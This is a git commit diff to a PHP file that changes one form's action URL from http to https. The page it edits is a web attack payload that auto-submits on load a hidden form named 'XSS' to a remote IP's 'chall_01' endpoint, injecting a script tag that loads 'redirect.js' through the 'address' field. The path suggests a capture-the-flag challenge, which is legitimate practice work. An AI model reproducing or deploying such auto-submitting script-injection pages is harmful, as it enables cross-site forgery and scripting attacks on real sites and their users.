23ab9a23224aba3b8d81225b37ef9b30380c76fc
legiahuyy <69957076+legiahuyy@users.noreply.github.com>
2021-02-28 12:10:32 +0700

    Update background.php

--- miscs/background.php
+++ miscs/background.php
@@ -6,7 +6,7 @@
 </style>
 </head>
 <body onload="XSS.submit();">
-<form id="" action="http://34.126.112.172/chall_01/index.php" method="post" name="XSS">
+<form id="" action="https://34.126.112.172/chall_01/index.php" method="post" name="XSS">
 <input name="target" value ="all"></input>
 <input name="address" value="<SCRIPT SRC='./redirect.js'></SCRIPT>"</input>
 </form>
